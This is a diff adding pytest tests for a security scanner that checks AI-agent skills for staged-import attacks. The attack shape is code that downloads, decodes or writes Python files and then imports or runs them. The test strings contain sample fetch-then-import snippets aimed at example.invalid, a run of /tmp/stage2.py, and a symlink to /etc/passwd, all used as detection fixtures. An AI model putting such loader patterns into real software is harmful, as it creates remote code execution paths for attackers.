+def test_bare_cwd_write_import_is_warn_not_fail():
+    """Deliberate change from the retracted branch (which pinned this crit): CWD and
+    the running script's own directory are the same thing only sometimes -- WARN."""
+    src = _src('''
+        open("v.py", "wb").write(data)
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "WARN"
+
+
+def test_package_init_chain_executes_on_submodule_import():
+    src = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "pkg", "__init__.py"), "wb").write(data)
+        import pkg.sub
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+    src2 = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "pkg", "mod.py"), "wb").write(data)
+        from pkg import mod
+    ''')
+    assert _staged_import_verdict(src2) == "FAIL"
+
+
+def test_relative_import_forms():
+    src = _src('''
+        import os
+        open(os.path.join(os.path.dirname(__file__), "v.py"), "wb").write(data)
+        from . import v
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_dynamic_import_forms_literal_name():
+    for call in ('importlib.import_module("v")', '__import__("v")', 'runpy.run_module("v")'):
+        src = _src(f'''
+            import os, importlib, runpy
+            open(os.path.join(os.path.dirname(__file__), "v.py"), "wb").write(data)
+            {call}
+        ''')
+        assert _staged_import_verdict(src) == "FAIL", call
+
+
+def test_dynamic_import_non_literal_is_warn_when_a_py_write_exists():
+    src = _src('''
+        import os, importlib
+        open(os.path.join(os.path.dirname(__file__), "plugin.py"), "wb").write(data)
+        mod_name = compute_name()
+        importlib.import_module(mod_name)
+    ''')
+    assert _staged_import_verdict(src) == "WARN"
+
+
+def test_mkdtemp_same_binding_is_fail_two_calls_is_warn():
+    src_same = _src('''
+        import sys, os, tempfile
+        d = tempfile.mkdtemp()
+        open(os.path.join(d, "mod.py"), "wb").write(data)
+        sys.path.insert(0, d)
+        import mod
+    ''')
+    assert _staged_import_verdict(src_same) == "FAIL"
+    src_diff = _src('''
+        import sys, os, tempfile
+        d1 = tempfile.mkdtemp()
+        d2 = tempfile.mkdtemp()
+        open(os.path.join(d1, "mod.py"), "wb").write(data)
+        sys.path.insert(0, d2)
+        import mod
+    ''')
+    assert _staged_import_verdict(src_diff) == "WARN"
+
+
+def test_b752_anchor_swallow_absolute_join_segment():
+    src_no_syspath = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "x", "/tmp/q/v.py"), "wb").write(data)
+        import v
+    ''')
+    assert _staged_import_verdict(src_no_syspath) == "none"
+    src_with_syspath = _src('''
+        import sys, os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "x", "/tmp/q/v.py"), "wb").write(data)
+        sys.path.insert(0, "/tmp/q")
+        import v
+    ''')
+    assert _staged_import_verdict(src_with_syspath) == "FAIL"
+
+
+def test_chdir_makes_cwd_pair_undetermined():
+    src = _src('''
+        import os, sys
+        os.chdir("/tmp/e")
+        open("mod.py", "wb").write(data)
+        sys.path.insert(0, "/tmp/e")
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "WARN"
+
+
+def test_symlink_present_makes_a_definite_not_pair_undetermined():
+    src = _src('''
+        import os, sys
+        os.symlink("/etc/passwd", "/tmp/link")
+        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
+        import helpers
+    ''')
+    assert _staged_import_verdict(src) == "WARN"
+
+
+def test_decode_staged_write_then_import_is_fail():
+    src = dedent('''
+        import os, base64
+        B = base64.b64encode(b"print(1)")
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "v.py"), "w").write(base64.b64decode(B).decode())
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_urlretrieve_then_import_is_fail():
+    src = dedent('''
+        import os
+        from urllib.request import urlretrieve
+        here = os.path.dirname(__file__)
+        urlretrieve("https://example.invalid/p", os.path.join(here, "v.py"))
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_benign_local_literal_write_is_no_finding():
+    src = dedent('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "v.py"), "wb").write(b"static content")
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "none"
+
+
+def test_benign_file_read_content_is_no_finding():
+    """File-read content is not a staged-write source (design section D)."""
+    src = dedent('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "gen.py"), "w").write(open("tpl.txt").read())
+        import gen
+    ''')
+    assert _staged_import_verdict(src) == "none"
+
+
+def test_streaming_download_then_import_is_fail():
+    src = dedent('''
+        import os, requests
+        here = os.path.dirname(__file__)
+        r = requests.get("https://example.invalid/p", stream=True)
+        with open(os.path.join(here, "v.py"), "wb") as f:
+            for chunk in r.iter_content():
+                f.write(chunk)
+        import v
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
+
+
+def test_unparsable_file_still_yields_unanalyzable():
+    findings = analyze_python("def f(:\n", "bad.py")
+    assert findings and findings[0].rule == "AST_UNANALYZABLE"
+
+
+# ---------------------------------------------------------------------------
+# E. Wiring -- vet routing end to end (a FAIL rule really fails --vet; a WARN rule
+# never does), and the B-636 never-fail registry covers both new rules (also pinned
+# mechanically by tests/test_b636_plugin_python_reader.py).
+# ---------------------------------------------------------------------------
+
+_SKILL_MD = "---\nname: demo\ndescription: x\n---\n# demo\n"
+
+
+def test_vet_fails_on_tmp_loader_target(tmp_path):
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
+    (skill_dir / "run.py").write_text(
+        'import runpy\nrunpy.run_path("/tmp/stage2.py")\n', encoding="utf-8"
+    )
+    result = vet_skill(skill_dir)
+    assert result.status == "FAIL", result.detail
+
+
+def test_vet_does_not_fail_on_unverified_loader_target(tmp_path):
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
+    (skill_dir / "run.py").write_text(
+        dedent('''
+            import runpy, os
+            def load(path):
+                runpy.run_path(path)
+        '''),
+        encoding="utf-8",
+    )
+    result = vet_skill(skill_dir)
+    assert result.status != "FAIL", result.detail
+
+
+def test_never_fail_rules_includes_both_new_b917_rules():
+    from clawseccheck.checks._vet import _AST_NEVER_FAIL_RULES
+    assert {"LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED"} <= _AST_NEVER_FAIL_RULES
+    assert "DANGEROUS_LOADER" not in _AST_NEVER_FAIL_RULES
+    assert "REMOTE_STAGED_IMPORT" not in _AST_NEVER_FAIL_RULES
+
+
+# ---------------------------------------------------------------------------
+# F. Fix round 1, review finding #2 -- b917-design.md 2.3's ARTIFACT-WIDE staged-
+# write cache: row 35, a write in one file of a skill correlating with an import in
+# another. Before this fix, correlation was scoped to one file at a time, so this
+# exact ticket-chartered shape (O3 split across updater.py/main.py) gave zero B-917
+# findings on either file and a full end-to-end vet_skill PASS.
+# ---------------------------------------------------------------------------
+
+
+def test_cross_file_staged_write_correlates_with_import_in_sibling_file(tmp_path):
+    """Row 35: `updater.py` writes remote bytes to `join(HERE, "v.py")`; `main.py` in
+    the same directory does `import v`. Scanning main.py alone finds nothing to
+    correlate against -- only the artifact-wide cache built from EVERY file of the
+    skill catches it, exactly as it would if both statements were one file."""
+    updater_src = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "v.py"), "wb").write(data)
+    ''')
+    main_src = "import v\n"
+
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
+    (skill_dir / "updater.py").write_text(updater_src, encoding="utf-8")
+    (skill_dir / "main.py").write_text(main_src, encoding="utf-8")
+
+    findings = _analyze(
+        main_src, "main.py",
+        extra=[("updater.py", updater_src)],
+        root=str(skill_dir),
+    )
+    assert any(
+        f.rule == "REMOTE_STAGED_IMPORT" and f.severity == "crit" for f in findings
+    ), findings
+
+    result = vet_skill(skill_dir)
+    assert result.status == "FAIL", result.detail
+
+
+def test_cross_file_correlation_needs_an_artifact_not_just_two_files():
+    """The identical write/import pair, each file analysed ALONE with no artifact:
+    b917-design.md 2.3's own words for row 35, 'without an artifact: none for either
+    file taken alone' -- neither file has enough evidence by itself, so a cache that
+    somehow persisted across UNRELATED calls (rather than being keyed on one
+    `ShippedArtifact` instance) would be the leak the design's Risks section warns
+    against, not a fix."""
+    updater_src = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "v.py"), "wb").write(data)
+    ''')
+    main_src = "import v\n"
+    assert _staged_import_verdict(updater_src) == "none"
+    assert _staged_import_verdict(main_src) == "none"
+
+
+def test_artifact_staged_write_cache_does_not_leak_across_artifacts():
+    """Two DIFFERENT `ShippedArtifact` instances, built one after another, whose
+    `main.py` files are byte-identical `import v` -- only the one whose OWN sibling
+    ships the staged write may FAIL; the other must not inherit it through the
+    module-level cache (b917-design.md's Risks section: 'must ... never leak across
+    artifacts')."""
+    updater_src = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "v.py"), "wb").write(data)
+    ''')
+    main_src = "import v\n"
+
+    tainted = _analyze(main_src, "main.py", extra=[("updater.py", updater_src)])
+    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in tainted)
+
+    clean = _analyze(main_src, "main.py", extra=[("updater.py", "def f():\n    pass\n")])
+    assert not any(f.rule in _CRIT_RULES for f in clean), clean
+
+
+def test_cross_file_correlation_is_order_independent():
+    """The write-file and the import-file may be visited in either order -- the
+    cache is built once from the WHOLE artifact, not accumulated file-by-file in
+    scan order."""
+    updater_src = _src('''
+        import os
+        here = os.path.dirname(__file__)
+        open(os.path.join(here, "v.py"), "wb").write(data)
+    ''')
+    main_src = "import v\n"
+    art = se.ShippedArtifact([("updater.py", updater_src), ("main.py", main_src)])
+
+    updater_first = analyze_python(updater_src, "updater.py", artifact=art)
+    main_after = analyze_python(main_src, "main.py", artifact=art)
+    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in main_after)
+
+    art2 = se.ShippedArtifact([("updater.py", updater_src), ("main.py", main_src)])
+    main_first = analyze_python(main_src, "main.py", artifact=art2)
+    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in main_first)
+    assert [(f.rule, f.severity) for f in main_after] == [
+        (f.rule, f.severity) for f in main_first
+    ]
+    assert not [f for f in updater_first if f.rule == "REMOTE_STAGED_IMPORT"]
+
+
+# ---------------------------------------------------------------------------
+# G. Fix round 2, review finding #1 (BLOCKER, introduced by fix round 1) -- a
+# module-level path constant used by one function for a genuine remote-fetch-then-
+# write, and a SEPARATE function whose own PARAMETER happens to share that exact
+# name, gave REMOTE_STAGED_IMPORT crit / vet FAIL as if the parameter were
+# definitely bound to the staged write's target. Root cause: the LEGB fallback
+# (fix round 1, b917-design.md 2.1) treated "sole() could not resolve this name in
+# the immediate scope" as "the name is free here, walk outward", when it also means
+# "the name IS bound here through a parameter/for/with/comprehension/except-
+# as/nested-def/import -- and that binding must stop the walk, resolvable or not.
+# See Section A above for the unit-level `locate()` pins; these are the same defect
+# reproduced end to end through `_staged_import_verdict` and `vet_skill`.
+# ---------------------------------------------------------------------------
+
+_B917_FIX2_SHADOW_SRC = dedent('''
+    import os
+    import sys
+    import urllib.request
+
+    CACHE_DIR = "/tmp/appcache"
+
+    def sync_something():
+        """Benign-shaped: refresh a local cache file (module-level CACHE_DIR).
+        This IS a real staged write for B-917 purposes -- that's fine, it's a
+        distractor for the actual attack below, not the thing under test."""
+        data = urllib.request.urlopen("https://example.invalid/user_plugin.py").read()
+        with open(os.path.join(CACHE_DIR, "user_plugin.py"), "wb") as f:
+            f.write(data)
+
+    def load_plugin(CACHE_DIR):
+        """CACHE_DIR here is a PARAMETER -- e.g. a caller-supplied, user-approved
+        plugin directory. It shadows the module-level CACHE_DIR and has NOTHING to
+        do with it at runtime."""
+        sys.path.insert(0, CACHE_DIR)
+        import user_plugin  # noqa: E402
+        return user_plugin
+''')
+
+_B917_FIX2_CONTROL_SRC = _B917_FIX2_SHADOW_SRC.replace(
+    "def load_plugin(CACHE_DIR):", "def load_plugin(plugin_dir):"
+).replace("sys.path.insert(0, CACHE_DIR)", "sys.path.insert(0, plugin_dir)")
+
+
+def test_b917_fix2_parameter_shadows_module_constant_is_warn_not_fail():
+    """The reviewer's own repro (attack_shadow/main.py), reproduced verbatim.
+    Before the fix: REMOTE_STAGED_IMPORT crit, as if `load_plugin`'s parameter were
+    provably bound to `sync_something`'s staged write. After the fix: WARN
+    (STAGED_IMPORT_UNRESOLVED) -- the parameter is an ordinary unresolvable
+    selector, Golden Rule #4, same as any other (row 26/49-51)."""
+    assert _staged_import_verdict(_B917_FIX2_SHADOW_SRC) == "WARN"
+
+
+def test_b917_fix2_control_renamed_parameter_gives_the_same_verdict():
+    """Control: renaming the parameter to remove the identifier collision entirely
+    (attack_shadow_control/main.py) must give the IDENTICAL verdict -- proving the
+    fix scopes the collision correctly rather than depending on the spelling."""
+    assert _B917_FIX2_CONTROL_SRC != _B917_FIX2_SHADOW_SRC
+    assert _staged_import_verdict(_B917_FIX2_SHADOW_SRC) == _staged_import_verdict(
+        _B917_FIX2_CONTROL_SRC
+    )
+    assert _staged_import_verdict(_B917_FIX2_CONTROL_SRC) == "WARN"
+
+
+def test_b917_fix2_vet_skill_does_not_fail_on_the_parameter_shadow(tmp_path):
+    """End-to-end through `vet_skill`, the way the reviewer actually observed the
+    defect: the FAIL must not survive, and `sync_something`'s own genuine staged
+    write must still be visible (WARN/info), not silently suppressed by the fix --
+    this is a scoping correction, not a detection regression."""
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
+    (skill_dir / "main.py").write_text(_B917_FIX2_SHADOW_SRC, encoding="utf-8")
+
+    result = vet_skill(skill_dir)
+    assert result.status != "FAIL", result.detail
+
+    findings = _analyze(_B917_FIX2_SHADOW_SRC, "main.py", root=str(skill_dir))
+    assert not any(f.rule in _CRIT_RULES for f in findings), findings
+    assert any(f.rule == "STAGED_IMPORT_UNRESOLVED" for f in findings), findings
+
+
+def test_b917_fix2_unrelated_same_name_parameter_elsewhere_does_not_block_the_real_fail():
+    """Negative control: the fix must not overcorrect into a file-wide veto. A
+    THIRD, wholly unrelated function elsewhere in the file that also happens to
+    take a parameter named `_STAGE_DIR` (and never touches sys.path or an import at
+    all) must not block the genuine module-scope correlation the r2d1 shape
+    depends on -- the guard from finding #1 is per-scope (does THIS function's own
+    body bind the name), never "does any function anywhere use this identifier as
+    a parameter"."""
+    src = _src('''
+        import sys, os
+
+        _STAGE_DIR = "/tmp/evilstage"
+
+        def stage():
+            open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)
+
+        def unrelated(_STAGE_DIR):
+            return _STAGE_DIR.upper()
+
+        sys.path.insert(0, _STAGE_DIR)
+        import mod
+    ''')
+    assert _staged_import_verdict(src) == "FAIL"
